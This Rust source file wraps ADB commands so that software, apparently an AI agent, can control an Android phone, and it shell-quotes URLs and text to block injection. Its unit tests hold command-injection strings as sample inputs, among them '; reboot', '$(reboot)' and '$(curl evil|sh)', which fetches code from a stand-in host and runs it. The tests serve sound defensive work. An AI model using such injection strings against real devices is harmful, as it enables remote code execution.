// Copyright (C) 2024-2026 Tristan Stoltz / Luminous Dynamics
// SPDX-License-Identifier: AGPL-3.0-or-later
//! ADB command wrapper for phone control.

use std::process::Command;

/// POSIX single-quote a string for safe inclusion in a device-side shell
/// command line.
///
/// `adb shell <arg1> <arg2> ...` joins its trailing arguments with spaces
/// and executes them via the device's on-device shell (`/system/bin/sh`) --
/// unlike a local `std::process::Command`, which passes argv entries
/// directly with no shell involved, ADB's remote execution model means any
/// shell metacharacter (`;`, `` ` ``, `$()`, `&`, `|`, ...) in a
/// caller-supplied value like a URL or text string IS interpreted by the
/// phone's shell. Wrapping the value in single quotes (escaping any
/// embedded `'` as `'\''`) makes the device shell treat it as one opaque
/// token regardless of its contents.
fn shell_quote(s: &str) -> String {
    format!("'{}'", s.replace('\'', r"'\''"))
}

/// ADB command executor for a specific device.
pub struct AdbDevice {
    serial: String,
}

impl AdbDevice {
    pub fn new(serial: impl Into<String>) -> Self {
        Self {
            serial: serial.into(),
        }
    }

    /// Device serial as configured at construction time.
    pub fn serial(&self) -> &str {
        &self.serial
    }

    /// Check if the device is connected and authorized.
    pub fn is_connected(&self) -> bool {
        let output = Command::new("adb").args(["devices"]).output().ok();
        output.map_or(false, |o| {
            String::from_utf8_lossy(&o.stdout).contains(&self.serial)
        })
    }

    /// Capture a screenshot and return the PNG bytes.
    ///
    /// Temp paths are scoped by device serial so multiple bridges (multi-phone
    /// use, or overlapping steps) never race on shared files.
    pub fn screenshot(&self) -> Result<Vec<u8>, String> {
        // Filename-safe serial: keeps paths unique per device while ensuring
        // no shell metacharacters or path separators reach the device shell.
        let safe_serial: String = self
            .serial
            .chars()
            .map(|c| if c.is_ascii_alphanumeric() { c } else { '_' })
            .collect();
        let device_path = format!("/sdcard/_symthaea_screen_{safe_serial}.png");
        let host_path = std::env::temp_dir().join(format!("_symthaea_phone_{safe_serial}.png"));
        let host_path_str = host_path
            .to_str()
            .ok_or_else(|| "non-UTF8 temp path".to_string())?;

        // Capture to device
        let status = Command::new("adb")
            .args(["-s", &self.serial, "shell", "screencap", "-p", &device_path])
            .status()
            .map_err(|e| format!("adb screencap failed: {e}"))?;
        if !status.success() {
            return Err("adb screencap returned non-zero".into());
        }

        // Pull to temp file
        let status = Command::new("adb")
            .args(["-s", &self.serial, "pull", &device_path, host_path_str])
            .status()
            .map_err(|e| format!("adb pull failed: {e}"))?;
        if !status.success() {
            return Err("adb pull returned non-zero".into());
        }

        std::fs::read(&host_path).map_err(|e| format!("Failed to read screenshot: {e}"))
    }

    /// Tap at screen coordinates.
    pub fn tap(&self, x: u32, y: u32) -> Result<(), String> {
        let status = Command::new("adb")
            .args([
                "-s",
                &self.serial,
                "shell",
                "input",
                "tap",
                &x.to_string(),
                &y.to_string(),
            ])
            .status()
            .map_err(|e| format!("adb tap failed: {e}"))?;
        if status.success() {
            Ok(())
        } else {
            Err("adb tap non-zero".into())
        }
    }

    /// Swipe from (x1,y1) to (x2,y2) over duration_ms.
    pub fn swipe(
        &self,
        x1: u32,
        y1: u32,
        x2: u32,
        y2: u32,
        duration_ms: u32,
    ) -> Result<(), String> {
        let status = Command::new("adb")
            .args([
                "-s",
                &self.serial,
                "shell",
                "input",
                "swipe",
                &x1.to_string(),
                &y1.to_string(),
                &x2.to_string(),
                &y2.to_string(),
                &duration_ms.to_string(),
            ])
            .status()
            .map_err(|e| format!("adb swipe failed: {e}"))?;
        if status.success() {
            Ok(())
        } else {
            Err("adb swipe non-zero".into())
        }
    }

    /// Type text.
    pub fn input_text(&self, text: &str) -> Result<(), String> {
        // Android's `input text` command uses %s as its own placeholder for
        // a literal space (spaces would otherwise split the argument at the
        // `input text` level); this is unrelated to shell quoting.
        let android_escaped = text.replace(' ', "%s");
        // Shell-quote on top of that: `adb shell` passes its trailing args
        // through the device's shell, so metacharacters in `text` (e.g.
        // from an LLM-generated task description) must not be interpretable
        // there. See `shell_quote` docs.
        let quoted = shell_quote(&android_escaped);
        let status = Command::new("adb")
            .args(["-s", &self.serial, "shell", "input", "text", &quoted])
            .status()
            .map_err(|e| format!("adb text failed: {e}"))?;
        if status.success() {
            Ok(())
        } else {
            Err("adb text non-zero".into())
        }
    }

    /// Press back button.
    pub fn back(&self) -> Result<(), String> {
        let status = Command::new("adb")
            .args(["-s", &self.serial, "shell", "input", "keyevent", "4"])
            .status()
            .map_err(|e| format!("adb back failed: {e}"))?;
        if status.success() {
            Ok(())
        } else {
            Err("adb back non-zero".into())
        }
    }

    /// Press home button.
    pub fn home(&self) -> Result<(), String> {
        let status = Command::new("adb")
            .args(["-s", &self.serial, "shell", "input", "keyevent", "3"])
            .status()
            .map_err(|e| format!("adb home failed: {e}"))?;
        if status.success() {
            Ok(())
        } else {
            Err("adb home non-zero".into())
        }
    }

    /// Open a URL in the default browser.
    pub fn open_url(&self, url: &str) -> Result<(), String> {
        // See `shell_quote` docs: `adb shell` passes trailing args through
        // the device's shell, so a URL containing shell metacharacters
        // (e.g. from a task description like "open youtube and search
        // <query>") must be quoted before reaching it.
        let quoted = shell_quote(url);
        let status = Command::new("adb")
            .args([
                "-s",
                &self.serial,
                "shell",
                "am",
                "start",
                "-a",
                "android.intent.action.VIEW",
                "-d",
                &quoted,
            ])
            .status()
            .map_err(|e| format!("adb open_url failed: {e}"))?;
        if status.success() {
            Ok(())
        } else {
            Err("adb open_url non-zero".into())
        }
    }

    /// Search YouTube for a query — uses the YouTube deep link.
    pub fn search_youtube(&self, query: &str) -> Result<(), String> {
        let encoded = query.replace(' ', "+");
        let url = format!("https://www.youtube.com/results?search_query={encoded}");
        self.open_url(&url)
    }

    /// Search the web via Google.
    pub fn search_web(&self, query: &str) -> Result<(), String> {
        let encoded = query.replace(' ', "+");
        let url = format!("https://www.google.com/search?q={encoded}");
        self.open_url(&url)
    }

    /// Launch a specific app by package name.
    pub fn launch_app(&self, package: &str) -> Result<(), String> {
        let status = Command::new("adb")
            .args([
                "-s",
                &self.serial,
                "shell",
                "monkey",
                "-p",
                package,
                "-c",
                "android.intent.category.LAUNCHER",
                "1",
            ])
            .status()
            .map_err(|e| format!("adb launch_app failed: {e}"))?;
        if status.success() {
            Ok(())
        } else {
            Err("adb launch_app non-zero".into())
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_adb_device_construction() {
        let dev = AdbDevice::new("test_serial");
        assert_eq!(dev.serial, "test_serial");
    }

    #[test]
    fn shell_quote_wraps_plain_value() {
        assert_eq!(shell_quote("hello"), "'hello'");
    }

    #[test]
    fn shell_quote_neutralizes_command_separator() {
        let malicious = "; reboot";
        let quoted = shell_quote(malicious);
        // The whole thing must be one single-quoted token -- no unescaped
        // `;` outside the quotes that a shell could split on.
        assert_eq!(quoted, "'; reboot'");
        assert!(quoted.starts_with('\''));
        assert!(quoted.ends_with('\''));
    }

    #[test]
    fn shell_quote_neutralizes_command_substitution() {
        for malicious in ["`reboot`", "$(reboot)", "$(curl evil|sh)"] {
            let quoted = shell_quote(malicious);
            assert_eq!(quoted, format!("'{malicious}'"));
        }
    }

    #[test]
    fn shell_quote_escapes_embedded_single_quote() {
        // A naive `'{}'` wrap would let an embedded `'` close the quoted
        // string early and re-open shell interpretation. Each embedded `'`
        // must become `'\''` (close-quote, literal quote, re-open-quote).
        let malicious = "x'; reboot; echo '";
        let quoted = shell_quote(malicious);
        assert_eq!(quoted, r"'x'\''; reboot; echo '\'''");
    }
}
